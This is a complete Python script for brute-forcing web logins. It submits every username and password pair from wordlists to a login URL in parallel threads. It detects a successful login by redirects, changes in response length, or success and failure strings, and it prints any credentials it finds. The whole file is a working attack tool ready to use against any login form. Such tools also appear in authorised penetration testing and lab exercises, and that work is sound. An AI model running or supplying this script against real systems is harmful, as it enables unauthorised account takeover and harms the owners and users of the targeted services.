#!/usr/bin/env python3
import argparse
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
import time

REDIRECT_CODES = {301, 302, 303, 307, 308}

def parse_args():
    p = argparse.ArgumentParser(description="Simple brute-forcer with proper success detection (redirect + baseline length).")
    p.add_argument("--url", required=True, help="Login URL (POST target)")
    p.add_argument("--cookie", required=False, help="Raw Cookie header value (e.g. 'session=...; other=...')")
    p.add_argument("--userlist", required=True, help="File with usernames (one per line)")
    p.add_argument("--passlist", required=True, help="File with passwords (one per line)")
    p.add_argument("--mode", default="bf", choices=["bf"], help="Mode (only bf supported)")
    p.add_argument("--concurrency", type=int, default=10, help="Number of concurrent workers")
    p.add_argument("--user-field", default="username", help="Form field name for username")
    p.add_argument("--pass-field", default="password", help="Form field name for password")
    p.add_argument("--fail-string", default=None, help="String present in failed login responses (optional)")
    p.add_argument("--success-string", default=None, help="String present in successful login (optional)")
    p.add_argument("--length-tolerance", type=int, default=10, help="Baseline length tolerance in bytes")
    return p.parse_args()

def read_lines(path):
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def make_session(cookie_raw=None):
    s = requests.Session()
    # Default headers - modify if you need
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (BruteForcerScript)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if cookie_raw:
        s.headers.update({"Cookie": cookie_raw})
    return s

def get_baseline(session, url, user_field, pass_field):
    """Do a known-bad login to capture baseline response length and redirect behavior."""
    data = {user_field: "invaliduser_does_not_exist_12345", pass_field: "invalidpass_12345"}
    try:
        resp = session.post(url, data=data, allow_redirects=False, timeout=10)
    except Exception as e:
        print(f"[-] Error getting baseline: {e}")
        sys.exit(1)
    baseline = {
        "status": resp.status_code,
        "len": len(resp.text),
        "redirect": (resp.status_code in REDIRECT_CODES) or ('Location' in resp.headers)
    }
    # Also capture a fail-string candidate if present
    return baseline, resp.text

def attempt_login(session, url, username, password, user_field, pass_field):
    data = {user_field: username, pass_field: password}
    try:
        resp = session.post(url, data=data, allow_redirects=False, timeout=10)
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}
    return {
        "status": resp.status_code,
        "len": len(resp.text),
        "headers": resp.headers,
        "text": resp.text
    }

def worker(session, url, user, pwd, user_field, pass_field, baseline, resp_fail_text, args, found_event):
    if found_event.is_set():
        return None
    res = attempt_login(session, url, user, pwd, user_field, pass_field)
    if "error" in res:
        return None

    status = res["status"]
    length = res["len"]
    headers = res["headers"]
    text = res["text"]

    # Condition 1: redirect (common reliable indicator)
    is_redirect = (status in REDIRECT_CODES) or ("Location" in headers)

    # Condition 2: response length differs significantly from baseline
    len_diff = abs(length - baseline["len"])
    len_changed = len_diff > args.length_tolerance

    # Condition 3: explicit success/fail string checks (optional)
    success_str_ok = False
    if args.success_string:
        if args.success_string in text:
            success_str_ok = True
    fail_str_missing = False
    if args.fail_string:
        if args.fail_string not in text:
            fail_str_missing = True

    # Aggregate detection logic:
    # treat as success if redirect OR (length changed) OR (success_string present) OR (fail_string missing)
    success = False
    reasons = []
    if is_redirect:
        success = True
        reasons.append("redirect")
    if len_changed:
        success = True
        reasons.append(f"len_changed (diff {len_diff})")
    if args.success_string and success_str_ok:
        success = True
        reasons.append("success_string")
    if args.fail_string and fail_str_missing:
        success = True
        reasons.append("fail_string_missing")

    # Print possible hit (mimic your tool output style)
    if success:
        found_event.set()
        reason_str = ", ".join(reasons) if reasons else "unknown"
        print(f"[***] POSSIBLE HIT -> {user}:{pwd} (status {status}, len={length}, redirect={is_redirect}) -- reason: {reason_str}")
        print(f"[+] SUCCESS: {user}:{pwd}")
        return (user, pwd, res)
    else:
        # For verbose debugging you can uncomment the next line
        # print(f"[-] {user}:{pwd} -> status {status}, len={length}, redirect={is_redirect}")
        return None

def main():
    args = parse_args()
    users = read_lines(args.userlist)
    pwds = read_lines(args.passlist)

    total = len(users) * len(pwds)
    print(f"[+] Loaded {len(users)} users x {len(pwds)} passwords = {total} attempts")

    session = make_session(args.cookie)
    baseline, fail_text = get_baseline(session, args.url, args.user_field, args.pass_field)
    print(f"[+] Baseline length: {baseline['len']} (status {baseline['status']}) redirect={baseline['redirect']}")

    found_event = threading.Event()
    start = time.time()

    # Use a fresh Session per worker thread to avoid cookie/session cross-effects
    def make_worker_session():
        return make_session(args.cookie)

    with ThreadPoolExecutor(max_workers=args.concurrency) as exe:
        futures = []
        for u,p in itertools.product(users, pwds):
            if found_event.is_set():
                break
            s = make_worker_session()
            futures.append(exe.submit(worker, s, args.url, u, p, args.user_field, args.pass_field, baseline, fail_text, args, found_event))

        # iterate to completion or until found_event
        try:
            for fut in as_completed(futures):
                if found_event.is_set():
                    break
                res = fut.result()
        except KeyboardInterrupt:
            print("[!] Interrupted by user")
        finally:
            end = time.time()
            elapsed = end - start
            print(f"[+] Finished in {elapsed:.1f}s")

if __name__ == "__main__":
    main()
